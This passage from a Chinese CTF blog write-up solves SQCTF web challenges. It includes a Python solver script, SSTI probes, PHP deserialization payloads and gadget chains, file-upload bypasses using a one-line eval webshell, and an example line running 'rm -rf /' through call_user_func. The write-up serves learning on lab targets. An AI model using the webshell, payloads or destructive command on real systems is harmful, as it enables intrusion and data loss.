+<li>对于浮点数，直接取整数部分（向下取整）。</li>
+<li>对于其他类型（如数组、对象），返回 <code>0</code> 或 <code>1</code>（PHP 8+ 会报错）</li>
+</ul>
+<h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><ul>
+<li><code>intval()</code> 的进制解析：当<code>intval()</code>的第二个参数为0时，会根据字符串格式自动判断进制：<ul>
+<li>以 <code>0</code> 开头解析为 <strong>八进制</strong>（如 <code>0123</code>）。</li>
+<li>以 <code>0x</code> 开头解析为 <strong>十六进制</strong>（如 <code>0x1abc</code>）。</li>
+<li>其他情况解析为 <strong>十进制</strong>。</li>
+</ul>
+</li>
+<li><strong>PHP松散比较（<code>==</code>）</strong>：不同类型比较时会尝试强制转换，例如字符串 <code>&quot;114514a&quot;</code> 会被转换为数字 <code>114514</code>。</li>
+</ul>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a><strong>绕过方法</strong></h4><p>传递一个值，使得：</p>
+<ol>
+<li><strong>原始值不等于 <code>114514</code></strong>（避免触发 <code>die()</code>）。</li>
+<li><strong><code>intval()</code> 转换后等于 <code>114514</code></strong>。</li>
+</ol>
+<p><strong>方法1：科学计数法</strong></p>
+<p>传入 <code>114514e0</code>：</p>
+<ul>
+<li>PHP会将 <code>114514e0</code> 视为浮点数 <code>114514.0</code>。</li>
+<li><strong>松散比较</strong>：<code>114514.0 == 114514</code> → <strong>触发 <code>die()</code></strong>（失败）。</li>
+</ul>
+<p><strong>方法2：十六进制或八进制</strong></p>
+<p>传入 <code>0x1BF82</code>（十六进制）或 <code>0337362</code>（八进制）：</p>
+<ul>
+<li>两者十进制均为 <code>114514</code>，导致直接触发 <code>die()</code>（失败）。</li>
+</ul>
+<p><strong>方法3：浮点数末尾非零</strong></p>
+<p>传入 <code>114514.1</code>：</p>
+<ul>
+<li><strong>松散比较</strong>：<code>114514.1 != 114514</code> → 不触发 <code>die()</code>。</li>
+<li><strong><code>intval()</code> 转换</strong>：截断小数部分 → <code>114514</code> → 满足条件。</li>
+</ul>
+<h3 id="Ez-calculate"><a href="#Ez-calculate" class="headerlink" title="Ez_calculate"></a>Ez_calculate</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>这个之前newstar碰到过，当时前端改了没有效果，所以这题惯性思维，直接脚本跑了（用ai改了一下之前的代码）<del>结果返回了&#x2F;flag这个路径，所以可以扫目录？</del></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">mport requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://challenge.qsnctf.com:31365/&quot;</span></span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>(<span class="params">expr</span>):</span><br><span class="line">    <span class="comment"># 统一清洗操作（处理特殊符号和空格）</span></span><br><span class="line">    expr = expr.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;×&#x27;</span>, <span class="string">&#x27;*&#x27;</span>).replace(<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;*&#x27;</span>).replace(<span class="string">&#x27;÷&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="built_in">eval</span>(expr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 1: 获取题目页面</span></span><br><span class="line">    r = s.get(BASE_URL, headers=HEADERS)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 2: 查找数学表达式（优化正则表达式）</span></span><br><span class="line">    expr_match = re.search(</span><br><span class="line">        <span class="string">r&#x27;&gt;([^&lt;]*\d+[+\-*/x×÷]\d+[+\-*/x×÷][^&lt;]+)&lt;&#x27;</span>,</span><br><span class="line">        r.text.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)  <span class="comment"># 移除所有空格确保匹配成功率</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> expr_match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;❌ 错误：无法识别数学表达式！网页内容片段：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text[:<span class="number">500</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    raw_expr = expr_match.group(<span class="number">1</span>).strip()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[DEBUG] 原始表达式字符串: <span class="subst">&#123;raw_expr&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 3: 处理并计算</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        answer = calculate(raw_expr)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;✅ 计算完成：<span class="subst">&#123;raw_expr&#125;</span> = <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 计算表达式失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 4: 提交答案（确保提交字符串格式）</span></span><br><span class="line">    r = s.post(BASE_URL, data=&#123;<span class="string">&#x27;value&#x27;</span>: <span class="built_in">str</span>(answer)&#125;, headers=HEADERS)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 5: 提取Flag（安全方式）</span></span><br><span class="line">    flag_match = re.search(<span class="string">r&#x27;flag\&#123;[^&#125;]+\&#125;&#x27;</span>, r.text, re.IGNORECASE)</span><br><span class="line">    <span class="keyword">if</span> flag_match:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n🎉 成功获取Flag: <span class="subst">&#123;flag_match.group()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n❌ 未找到Flag，可能原因：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- 答案计算错误&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- 页面结构改变&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;- 服务器限制（如频率）&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n服务器返回内容片段：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(r.text[:<span class="number">500</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250410175238783.png" alt="image-20250410175238783"></p>
+<h3 id="My-Blog"><a href="#My-Blog" class="headerlink" title="My Blog"></a>My Blog</h3><p>什么都没有，就找到一个登录账号密码，刚开始以为是注入，结果没有办法输进去</p>
+<p>之后感觉，如果有登录账号密码，就一定有登录页面，于是选择了dirsearch扫一遍，结果刚好出来了，再用找到的账号密码登录</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250410175721586.png" alt="image-20250410175721586"></p>
+<h3 id="哎呀大大大黑塔"><a href="#哎呀大大大黑塔" class="headerlink" title="哎呀大大大黑塔"></a>哎呀大大大黑塔</h3><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>看了好几遍pv，pv里的数字尝试了好几遍</p>
+<p>还是看到群里好兄弟提示说不在pv但是是视频，尝试了日期，评论区等最后bv号成功了。</p>
+<p>进去之后是反序列化。</p>
+<ol>
+<li><strong>目标条件</strong>：<ul>
+<li>反序列化后的 <code>Secret</code> 对象需满足：<code>$this-&gt;key === &quot;SQCTF&quot;</code></li>
+<li>触发 <code>__destruct()</code> 方法时会包含 <code>flag.php</code> 并输出flag</li>
+</ul>
+</li>
+</ol>
+<h4 id="解法："><a href="#解法：" class="headerlink" title="解法："></a>解法：</h4><p>payload如下</p>
+<p><code>O:6:&quot;Secret&quot;:1:&#123;s:3:&quot;key&quot;;s:5:&quot;SQCTF&quot;;&#125;</code></p>
+<p><code>URL编码后：data=O%3A6%3A%22Secret%22%3A1%3A%7Bs%3A3%3A%22key%22%3Bs%3A5%3A%22SQCTF%22%3B%7D</code></p>
+<h3 id="唯一"><a href="#唯一" class="headerlink" title="唯一"></a>唯一</h3><h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>这题刚开始没什么思路，找了半天没想法。<code>我的笔记：？</code>冒号之后的内容没有办法显示，所以卡在这。然后也是和ai交流了一下，返回可以在笔记内容有输入，note&#x3D;xx；</p>
+<p>尝试了一下确实可以正常回显了</p>
+<p>不过还是不能进行sql注入，那就试试ssti <code>?note=&#123;&#123;7*7&#125;&#125;</code>,回显49，说明可以ssti。</p>
+<p>那就feijing一把梭</p>
+<h4 id="解法：-1"><a href="#解法：-1" class="headerlink" title="解法："></a>解法：</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250410215347826.png" alt="image-20250410215347826"></p>
+<h3 id="Upload-Level1"><a href="#Upload-Level1" class="headerlink" title="Upload_Level1"></a>Upload_Level1</h3><p>恰好之前看过，再加上提示了马，所以就想到了文件上传一句话木马<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code>,不过这里限制了上传不能是php，只能是jpg….所以先改成jpg后缀，再用bp抓包，改成php发送，就可以用蚁剑连接了</p>
+<h3 id="Upload-Level2"><a href="#Upload-Level2" class="headerlink" title="Upload_Level2"></a>Upload_Level2</h3><p>这题感觉比1还简单，因为写了only images，所以就先上传了.jpg后缀，再用bp抓包，改成php后缀，成功上传，用蚁剑就可以了</p>
+<h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby rce"></a>baby rce</h3><h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>pass1是sha1绕过，然后就调用函数了</p>
+<p>学习了一下<code>call_user_func()函数</code><del>大概就是把输入的内容作为函数运行</del></p>
+<p><code>call_user_func(&quot;system&quot;, &quot;rm -rf /&quot;); // 等同于 system(&quot;rm -rf /&quot;)</code></p>
+<h4 id="函数基本功能"><a href="#函数基本功能" class="headerlink" title="函数基本功能"></a><strong>函数基本功能</strong></h4><p><code>call_user_func()</code> 是 PHP 中的一个内置函数，用于<strong>动态调用用户自定义的函数或方法</strong>。其基本语法为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed call_user_func(callable $callback [, mixed $parameter [, mixed $... ]])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>参数<ul>
+<li><code>$callback</code>：要调用的函数名（字符串）或方法数组（如 <code>[&#39;Class&#39;, &#39;method&#39;]</code>）。</li>
+<li><code>$parameter...</code>：可选参数，传递给被调用函数的参数。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h5 id="代码示例分析"><a href="#代码示例分析" class="headerlink" title="代码示例分析"></a>代码示例分析</h5><p>用户提供的代码片段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($_POST[&#x27;payload&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>行为解析<ul>
+<li>从 HTTP POST 请求中获取名为 <code>payload</code> 的参数值。</li>
+<li>将该值直接作为函数名调用，例如：<ul>
+<li>用户提交 <code>payload=phpinfo</code> → 执行 <code>phpinfo()</code>。</li>
+<li>用户提交 <code>payload=system</code> → 执行 <code>system()</code>。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>为什么用 <code>::</code> 而不是 <code>-&gt;</code>？</strong></p>
+<ul>
+<li><p><code>-&gt;</code></p>
+<p>用于实例化对象的非静态方法调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$obj = new TYctf();</span><br><span class="line">$obj-&gt;getKey(); // 调用对象实例的非静态方法</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>::</code></strong> 用于直接调用类的<strong>静态方法</strong>，无需创建对象实例，更简洁且适合攻击场景。</p>
+</li>
+</ul>
+<h4 id="解法：-2"><a href="#解法：-2" class="headerlink" title="解法："></a>解法：</h4><ol>
+<li><p><strong>发送GET请求</strong>（绕过Level 1）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?param1=aaroZmOk&amp;param2=aaK1STfY</span><br></pre></td></tr></table></figure>
+
+<p>响应会返回 <code>Level 1 pass</code>。</p>
+</li>
+<li><p><strong>发送POST请求</strong>（触发Level 2）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">...</span><br><span class="line">param1=aaroZmOk&amp;param2=aaK1STfY&amp;payload=TYctf::getKey</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="白月光"><a href="#白月光" class="headerlink" title="白月光"></a>白月光</h3><p>刚开始以为是sql注入，尝试许久没有反应。再尝试了49发现回显49，那就是ssti了。</p>
+<p>直接feijing一把梭了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://flyfish567.oss-cn-shenzhen.aliyuncs.com/web.imgimage-20250410213453075.png" alt="image-20250410213453075"></p>
+<h3 id="无参之舞（没写出来）"><a href="#无参之舞（没写出来）" class="headerlink" title="无参之舞（没写出来）"></a>无参之舞（没写出来）</h3><h3 id="eeaassyy"><a href="#eeaassyy" class="headerlink" title="eeaassyy"></a>eeaassyy</h3><h5 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a><strong>思路</strong>：</h5><p><del>乐，分数低自然是不难</del></p>
+<p>刚开始点进去一片空白，想看源代码，但是右键和F12都被禁止了，那就用<code>view-source:</code>然后就出来了</p>
+<h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$payload</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;stop&quot;</span>,<span class="variable">$payload</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$user</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pswd</span> = <span class="string">&#x27;sunshine&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="variable">$user</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$payload</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$profile</span>-&gt;pswd==<span class="string">&#x27;escaping&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;逃出来了, 恭喜恭喜&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><ol>
+<li><p><strong>过滤规则</strong>：<code>filter()</code> 函数会将 <code>flag</code> 和 <code>php</code> 替换为 <code>stop</code></p>
+</li>
+<li><p><strong>目标条件</strong>：反序列化后对象的 <code>pswd</code> 属性值需为 <code>escaping</code></p>
+</li>
+<li><p>类结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class test &#123;</span><br><span class="line">    var $user = &#x27;test&#x27;;</span><br><span class="line">    var $pswd = &#x27;sunshine&#x27;;</span><br><span class="line">    function __construct($user) &#123; $this-&gt;user = $user; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="绕过方案-1"><a href="#绕过方案-1" class="headerlink" title="绕过方案"></a>绕过方案</h4><p><strong>步骤 1️⃣：生成基础 payload</strong></p>
+<p>生成一个 <code>test</code> 类的序列化字符串，将 <code>pswd</code> 设为 <code>escaping</code>：</p>
+<PHP>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test &#123;</span><br><span class="line">    var $user = &#x27;test&#x27;;</span><br><span class="line">    var $pswd = &#x27;sunshine&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new test(&#x27;hacker&#x27;);</span><br><span class="line">$obj-&gt;pswd = &#x27;escaping&#x27;;</span><br><span class="line">echo serialize($obj);</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:6:&quot;hacker&quot;;s:4:&quot;pswd&quot;;s:8:&quot;escaping&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 2️⃣：绕过属性名过滤</strong></p>
+<p>由于 <code>filter()</code> 只替换值中的关键字（不影响属性名），直接使用原始 payload 即可。</p>
+<p>最终 Payload</p>
+<p>直接将生成的序列化字符串作为 GET 参数传递：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target.com/?payload=O:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:6:&quot;hacker&quot;;s:4:&quot;pswd&quot;;s:8:&quot;escaping&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行效果</p>
+<ol>
+<li><p>服务端反序列化后对象属性：</p>
+<PHP>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$profile-&gt;user = &quot;hacker&quot;</span><br><span class="line">$profile-&gt;pswd = &quot;escaping&quot;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>满足 <code>$profile-&gt;pswd == &#39;escaping&#39;</code> 条件，输出 flag。</p>
+</li>
+</ol>
+<h3 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h3><h4 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>关键代码段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反序列化入口</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 限制条件1：file不能是数组，且MD5不等于flag.php的MD5</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>-&gt;file) || <span class="title function_ invoke__">md5</span>(<span class="variable">$data</span>-&gt;file) === <span class="title function_ invoke__">md5</span>(<span class="string">&quot;flag.php&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No cheating!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 限制条件2：file不能包含php://协议</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>-&gt;file, <span class="string">&#x27;php://&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;No php protocol!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 目标触发条件：content必须为&quot;GET_FLAG&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span>-&gt;content === <span class="string">&quot;GET_FLAG&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Flag: &quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>); <span class="comment">// 直接输出flag</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>核心矛盾点</li>
+</ol>
+<ul>
+<li><p><strong>表面条件</strong>：需要满足 <code>$data-&gt;content === &quot;GET_FLAG&quot;</code></p>
+</li>
+<li><p>深层限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data-&gt;file</span><br></pre></td></tr></table></figure>
+
+<p>必须绕过两个过滤条件：</p>
+<ul>
+<li><strong>不能是数组</strong>：防止通过数组绕过MD5检测</li>
+<li><strong>MD5值不能等于 <code>md5(&quot;flag.php&quot;)</code></strong>：即 <code>$data-&gt;file</code> 的字符串值不能是 <code>flag.php</code></li>
+<li><strong>不能包含 <code>php://</code> 协议</strong>：防止直接使用协议流读取文件</li>
+</ul>
+</li>
+</ul>
+<h4 id="攻击链构造"><a href="#攻击链构造" class="headerlink" title="攻击链构造"></a>攻击链构造</h4><p>步骤 1️⃣：构建魔术方法链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 创建yyy对象，用于读取flag.php内容</span><br><span class="line">$yyy = new yyy();</span><br><span class="line">$yyy-&gt;path = &quot;flag.php&quot;;   // 目标文件</span><br><span class="line">$yyy-&gt;allowed = true;      // 允许读取</span><br><span class="line"></span><br><span class="line">// 创建xxx对象，触发yyy的__toString()</span><br><span class="line">$xxx = new xxx();</span><br><span class="line">$xxx-&gt;data = $yyy;         // 调用$xxx-&gt;__toString()时触发$yyy-&gt;__toString()</span><br><span class="line"></span><br><span class="line">// 创建hhh对象，设置file属性为xxx对象</span><br><span class="line">$hhh = new hhh();</span><br><span class="line">$hhh-&gt;file = $xxx;         // 反序列化时触发__toString()链</span><br><span class="line">$hhh-&gt;content = &quot;GET_FLAG&quot;;// 满足核心条件</span><br></pre></td></tr></table></figure>
+
+<p>步骤 2️⃣：序列化Payload</p>
+<p>生成的序列化字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;hhh&quot;:2:&#123;s:4:&quot;file&quot;;O:3:&quot;xxx&quot;:1:&#123;s:4:&quot;data&quot;;O:3:&quot;yyy&quot;:2:&#123;s:4:&quot;path&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;allowed&quot;;b:1;&#125;&#125;s:7:&quot;content&quot;;s:8:&quot;GET_FLAG&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="绕过原理-1"><a href="#绕过原理-1" class="headerlink" title="绕过原理"></a>绕过原理</h4><ol>
+<li>MD5动态计算绕过</li>
+</ol>
+<ul>
+<li>触发时机当执行<code>md5($data-&gt;file)</code>时：<ol>
+<li><code>$data-&gt;file</code> 是 <code>xxx</code> 对象 → 触发 <code>xxx::__toString()</code></li>
+<li><code>xxx-&gt;data</code> 是 <code>yyy</code> 对象 → 触发 <code>yyy::__toString()</code></li>
+<li><code>yyy</code> 对象读取 <code>flag.php</code> 内容 → 返回文件内容字符串</li>
+</ol>
+</li>
+<li><strong>实际计算值</strong>：<code>md5(flag.php文件内容)</code></li>
+<li><strong>绕过条件</strong>：<code>md5(文件内容) ≠ md5(&quot;flag.php&quot;)</code>（必然成立）</li>
+</ul>
+<ol start="2">
+<li>协议过滤绕过</li>
+</ol>
+<ul>
+<li><strong>不使用协议流</strong>：直接通过 <code>yyy</code> 类读取文件路径 <code>flag.php</code></li>
